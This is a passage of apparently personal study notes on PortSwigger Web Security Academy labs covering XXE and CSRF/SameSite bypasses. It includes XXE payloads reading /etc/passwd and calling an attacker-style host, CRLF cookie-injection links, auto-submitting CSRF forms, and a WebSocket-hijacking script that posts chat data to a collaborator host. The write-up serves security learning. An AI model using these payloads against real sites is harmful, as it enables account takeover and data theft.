<code>SYSTEM</code>keyword and must specify a URL from which the value of the entity shouldbe loaded. For example:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY ext SYSTEM "http://normal-website.com" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><p>The URL can use the <code>file://</code> protocol, and so externalentities can be loaded from file. For example:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY ext SYSTEM "file:///path/to/file" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><p>XML external entities provide the primary means by which XML externalentity attacks arise</p></li></ol><h4 id="lab-blind-xxe-with-out-of-band-interaction">Lab: Blind XXE without-of-band interaction</h4><ol type="1"><li>OAST<img src="https://s2.loli.net/2023/08/15/dgkBQ8bUxv3m6T5.png"alt="image-20230815073424075" /></li></ol><hr /><ol type="1"><li><p>use XML parameter entities</p></li><li><p>First, the declaration of an XML parameter entity includes the<code>percent character</code> before the entity name:</p></li></ol><pre><code>  <pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></pre></code></pre><ol start="2" type="1"><li><p>parameter entities are referenced <strong>using the percentcharacter instead of the usual ampersand</strong>:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">%myparameterentity;</code></pre></li><li><p>example:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</code></pre></li></ol><h4id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">Lab:Blind XXE with out-of-band interaction via XML parameter entities</h4><ol type="1"><li>OAST<img src="https://s2.loli.net/2023/08/15/YKZ6rwjxQoDB3UH.png"alt="image-20230815074602770" /></li></ol><hr /><h4id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">Lab:Exploiting blind XXE to exfiltrate data using a malicious externalDTD</h4><ol type="1"><li>make XXE paylaod<ol type="1"><li>store<img src="https://s2.loli.net/2023/08/15/aWmsXDJyeVth5N6.png"alt="image-20230815082052829" /></li><li>view exploit:copy url<imgsrc="https://s2.loli.net/2023/08/15/ayoh5i3qGOXnPE2.png"alt="image-20230815082203560" /></li></ol></li><li>this post:paste url<imgsrc="https://s2.loli.net/2023/08/15/Qa2vCq8NwofnUJW.png"alt="image-20230815082241668" /></li></ol><h4id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">Lab:Exploiting blind XXE to retrieve data via error messages</h4><ol type="1"><li>process it as the previous lab <imgsrc="https://s2.loli.net/2023/08/15/qjwMpftJUs5zR4P.png"alt="image-20230815092937193" /></li></ol><h4 id="exploiting-blind-xxe-by-repurposing-a-local-dtd">Exploitingblind XXE by repurposing a local DTD</h4><ol type="1"><li><p>If a document's DTD uses a <strong>hybrid</strong> of internaland external DTD declarations, then the internal DTD can redefineentities that are declared in the external DTD. When this happens, therestriction on using an XML parameter entity within the definition ofanother parameter entity is <strong>relaxed</strong>.</p></li><li><p>攻击者可以通过使用<code>内部DTD</code>中的错误型XXE技术，重新定义<code>外部DTD</code>中已声明的实体</p></li><li><p>example</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;&lt;!ENTITY % custom_entity &#39;&lt;!ENTITY &#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY &#x25; eval &quot;&lt;!ENTITY &#x26;#x25; error SYSTEM &#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&#x25;file;&#x27;&gt;&quot;&gt;&#x25;eval;&#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre></li><li><p>For example, Linux systems using the GNOME desktop environmentoften have a DTD file at <code>/usr/share/yelp/dtd/docbookx.dtd</code>.You can test whether this file is present by submitting the followingXXE payload, which will cause an error if the file is missing:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; %local_dtd; ]&gt;</code></pre></li><li><p>After you have tested a list of common DTD files to locate a filethat is present, you then need to obtain a <strong>copy of thefile</strong> and review it to find an entity that you canredefine.</p></li></ol><h4id="lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd">Lab:Exploiting XXE to retrieve data by repurposing a local DTD</h4><ol type="1"><li>solve:<img src="https://s2.loli.net/2023/08/15/eEs1MmOkjpQXKf2.png"alt="image-20230815131538046" /></li></ol><h3 id="cross-site-request-forgery-csrf">Cross-site request forgery(CSRF)</h3><h4 id="how-to-construct-a-csrf-attack">How to construct a CSRFattack</h4><ol type="1"><li><code>CSRF PoC Genterator</code></li></ol><h4 id="lab-csrf-vulnerability-with-no-defenses">Lab: CSRF vulnerabilitywith no defenses</h4><ol type="1"><li>at: change-email request<imgsrc="https://s2.loli.net/2023/08/16/iXI5sbAn9JweNl6.png"alt="image-20230816025332908" /><ol type="1"><li>generate CSRF Poc</li></ol></li><li>perform asction as following:<imgsrc="https://s2.loli.net/2023/08/16/Wc2uaPFUrzGpe4j.png"alt="image-20230816025648535" /></li><li>paste in exploit server<imgsrc="https://s2.loli.net/2023/08/16/bL4cgFwBMkDrS9e.png"alt="image-20230816025727622" /><ol type="1"><li>store-&gt;deliver exploit to victim</li></ol></li></ol><h4 id="what-is-the-difference-between-xss-and-csrf">What is thedifference between XSS and CSRF?</h4><ol type="1"><li>CSRF can be described as a "<strong>one-way"</strong> vulnerability,in that while an attacker can induce the victim to issue an HTTPrequest, they cannot retrieve the response from that request.Conversely, XSS is "<strong>two-way</strong>"</li></ol><h4 id="bypassing-csrf-token-validation">Bypassing CSRF tokenvalidation</h4><ol type="1"><li>A common way to share CSRF tokens with the client is to include themas a <code>hidden parameter</code> in an HTML form</li></ol><h4 id="lab-csrf-where-token-validation-depends-on-request-method">Lab:CSRF where token validation depends on request method</h4><ol type="1"><li>check request way<imgsrc="https://s2.loli.net/2023/08/16/Z6TKqNsY1niwh8B.png"alt="image-20230816034729480" /></li><li>chang <code>POST</code> to <code>GET</code>:no longer verify <imgsrc="https://s2.loli.net/2023/08/16/rW74VNHfuOh9cQK.png"alt="image-20230816034754479" /></li><li>Generate Poc</li><li>store and deliver</li></ol><h4id="lab-csrf-where-token-validation-depends-on-token-being-present">Lab:CSRF where token validation depends on token being present</h4><ol type="1"><li>delete the whole csrf tokens<ol type="1"><li>only left email parameter <imgsrc="https://s2.loli.net/2023/08/16/FgO4BaQ7KYGsvA6.png"alt="image-20230816040520160" /></li></ol></li></ol><h4 id="lab-csrf-where-token-is-not-tied-to-user-session">Lab: CSRFwhere token is not tied to user session</h4><ol type="1"><li>login in with wiener and carlos respectively</li><li>note that a csrf token can be used only once</li><li>with wiener:intercept this request,copy this csrf token ,then dropthis request<imgsrc="https://s2.loli.net/2023/08/16/zdxmWc5DAuLqFTi.png" /></li><li>with carlos:replace csrf token with the copy one,generate PoC</li></ol><h4 id="csrf-token-is-tied-to-a-non-session-cookie">CSRF token is tiedto a non-session cookie</h4><ol type="1"><li><p>example</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>email<span class="token path-separator">/</span>change</span></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">68</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span></span>csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</code></pre></li><li><p>The attacker can log in to the application using their ownaccount, obtain a valid token and associated cookie, leverage the<code>cookie-setting behavior</code> to place their cookie into thevictim's browser, and feed their token to the victim in their CSRFattack.</p></li></ol><h4 id="lab-csrf-where-token-is-tied-to-non-session-cookie">Lab: CSRFwhere token is tied to non-session cookie</h4><ol type="1"><li><p>csrfkey 未绑定session</p></li><li><p>注入cookie的恶意链接</p><pre class="language-http" data-language="http"><code class="language-http">/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None</code></pre><ol type="1"><li>/?search= 表示调用搜索功能,search参数可控。</li><li>test%0d%0a 是无害的搜索词,对注入没有实际作用。</li><li>Set-Cookie: 表示开始注入cookie。</li><li>csrfKey=YOUR-KEY 是注入的cookie名称和值。</li><li>%3b%20SameSite=None 对cookie进行配置。</li><li>攻击者先在自己账号中获取合法的csrfKey cookie。</li><li>然后构造这个链接,将自己的cookie注入到受害者浏览器。</li><li>受害者访问链接会自动在浏览器保存这个cookie。</li><li>这样攻击者就可以绕过CSRF保护,因为浏览器会带上这个cookie访问站点。</li></ol></li><li><p>最终html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a79001e0472b581a144a43a002400c6.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test3<span class="token entity" title="&#64;">&amp;#64;</span>gamil<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4zZPk7MTEJOt0hr9fuNakOScYLVOaHS4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a79001e0472b581a144a43a002400c6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SKs779vOfNH2Mof5bXp7M8jRsmqjnkg5%3b%20SameSite=None<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="lab-csrf-where-token-is-duplicated-in-cookie">Lab: CSRF wheretoken is duplicated in cookie</h4><ol type="1"><li>payload: note that csrf value within two positions are the same<imgsrc="https://s2.loli.net/2023/08/16/mkBytUGw62l4WMC.png"alt="image-20230816072149480" /><ol type="1"><li>remember to delete<code>&lt;script&gt;</code> tag</li></ol></li></ol><h4 id="bypassing-samesite-cookie-restrictions">Bypassing SameSitecookie restrictions</h4><ol type="1"><li><p>What's the difference between a site and an origin?</p><table><colgroup><col style="width: 24%" /><col style="width: 29%" /><col style="width: 20%" /><col style="width: 25%" /></colgroup><thead><tr class="header"><th><strong>Request from</strong></th><th><strong>Request to</strong></th><th><strong>Same-site?</strong></th><th><strong>Same-origin?</strong></th></tr></thead><tbody><tr class="odd"><td><code>https://example.com</code></td><td><code>https://example.com</code></td><td>Yes</td><td>Yes</td></tr><tr class="even"><td><code>https://app.example.com</code></td><td><code>https://intranet.example.com</code></td><td>Yes</td><td>No: mismatched domain name</td></tr><tr class="odd"><td><code>https://example.com</code></td><td><code>https://example.com:8080</code></td><td>Yes</td><td>No: mismatched port</td></tr><tr class="even"><td><code>https://example.com</code></td><td><code>https://example.co.uk</code></td><td>No: mismatched eTLD</td><td>No: mismatched domain name</td></tr><tr class="odd"><td><code>https://example.com</code></td><td><code>http://example.com</code></td><td>No: mismatched scheme</td><td>No: mismatched scheme</td></tr></tbody></table></li></ol><h4 id="lab-samesite-lax-bypass-via-method-override">Lab: SameSite Laxbypass via method override</h4><ol type="1"><li><p>check request:no csrf token bu <code>SAMEORGIN</code>exist</p></li><li><p>modify request method to <code>GET</code> and add<code>_method</code> parameter<imgsrc="https://s2.loli.net/2023/08/16/DFGEtAR5WhP9T2d.png"alt="image-20230816090515390" /></p></li><li><p>craft an exploit</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a6700a204464af4821c4dbb00cb0088.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token entity" title="&#64;">&amp;#64;</span>gmail<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity" title="&#95;">&amp;#95;</span>method<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://0a6700a204464af4821c4dbb00cb0088.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST"</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><ol type="1"><li>attention:<ol type="1"><li>different email</li><li><code>script</code>:docunment.location</li></ol></li></ol></li></ol><h4 id="lab-samesite-strict-bypass-via-client-side-redirect">Lab:SameSite Strict bypass via client-side redirect</h4><ol type="1"><li>observe:<imgsrc="https://s2.loli.net/2023/08/16/1Qmkw9aNPnV78FZ.png"alt="image-20230816102005808" /></li><li>paste following url in address bar<imgsrc="https://s2.loli.net/2023/08/16/jhOfduPDc4rHxn2.png"alt="image-20230816102219219" /><ol type="1"><li>after a while:ridect <code>my-account</code> page</li></ol></li><li>test script<imgsrc="https://s2.loli.net/2023/08/16/mKXoH9zE3TM2VkW.png"alt="image-20230816102318906" /><ol type="1"><li>view exploit: back to <code>my-account</code> page</li></ol></li><li>craft an exploit:<imgsrc="https://s2.loli.net/2023/08/16/LhDprHBE4q5K9OX.png"alt="image-20230816102935833" /><ol type="1"><li>keep same email address within two positions</li><li>add <code>&amp;submit=1</code> to suffix<ol type="1"><li><code>&amp;</code> need urlcode as <code>postid</code>vaule,otherwise the link will be terminated before<code>submit</code></li></ol></li></ol></li></ol><hr /><ol type="1"><li>It's essential to keep in mind that a request can still be same-siteeven if it's <strong>issued cross-origin</strong></li></ol><h4 id="lab-samesite-strict-bypass-via-sibling-domain">Lab: SameSiteStrict bypass via sibling domain</h4><ol type="1"><li><p><del>necessary to complete <code>WebSockets</code> topic beforethis</del></p></li><li><p>aim at:<strong>live chat</strong></p></li><li><p>Confirm the <code>CSWSH vulnerability</code></p><ol type="1"><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://YOUR-LAB-ID.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-COLLABORATOR-PAYLOAD.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>click <code>store &amp; view</code></p></li><li><p>in <code>proxy history</code>: noted that thistrigger<code>GET /chat</code> request but no cookie,so only exfiltratedthe chat history for <strong>a brand new session</strong></p></li></ol></li><li><p>request some <strong>resource file</strong>(like js or image),inresponse:observe that <code>Access-Control-Allow-Origin</code> header<img src="https://s2.loli.net/2023/08/17/KGey6hFPnHi7a31.png"alt="image-20230817064307214" /></p></li><li><p>copy url,paste in browser<imgsrc="https://s2.loli.net/2023/08/17/RGp8KmbksYqDLfT.png"alt="image-20230817064657141" /></p></li><li><p><code>Username</code> xss vulnerbility: convert <code>POST</code>to GET ,confirmed still effective<imgsrc="https://s2.loli.net/2023/08/17/GF3OfkbpNeKVaQ1.png"alt="image-20230817064740387" /></p></li><li><p>aim at xss:</p><ol type="1"><li><p>username parameter: urlencode</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://YOUR-LAB-ID.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-COLLABORATOR-PAYLOAD.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>craft exploit</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&amp;password=anything"</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li></ol></li><li><p><code>store and deliver</code>, poll<imgsrc="https://s2.loli.net/2023/08/17/RYxG1HfwWbaI6DC.png"alt="image-20230817065412116" /></p></li></ol><h4id="bypassing-samesite-lax-restrictions-with-newly-issued-cookies">BypassingSameSite Lax restrictions with newly issued cookies</h4><ol type="1"><li>to avoid breaking single sign-on (SSO) mechanisms, it doesn'tactually enforce these restrictions for the <strong>first 120seconds</strong> on top-level <code>POST</code> requests. As a result,there is a two-minute window in which users may be susceptible tocross-site attacks.This can't suite the website that explicitly set withthe <code>SameSite=Lax</code></li></ol><h4 id="lab-samesite-lax-bypass-via-cookie-refresh">Lab: SameSite Laxbypass via cookie refresh</h4><ol type="1"><li><p>noted that if u want request: <strong>change email</strong>,thiswill trigger another request<imgsrc="https://s2.loli.net/2023/08/17/QsYTeFAdx7BftaL.png"alt="image-20230817074231027" /></p></li><li><p>Attempt a <code>CSRF attack</code></p><ol type="1"><li><p>script</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"foo@bar.com"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit request"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>if u complete if less than 2minutes,this will besucessful</p></li><li><p>find the <code>POST /my-account/change-email</code> request andconfirm that your session <strong>cookie</strong> was included eventhough this is a cross-site <code>POST</code> request.</p></li></ol></li><li><p>In the browser, notice that if you visit<code>/social-login</code>, this automatically initiates the full OAuthflow. If you still have a logged-in session with the OAuth server, thisall happens without any interaction.</p><ol type="1"><li><p>script</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"POST"</span> action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"pwned@web-security-academy.net"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>Observe that the initial request <strong>gets blocked</strong> bythe browser's popup 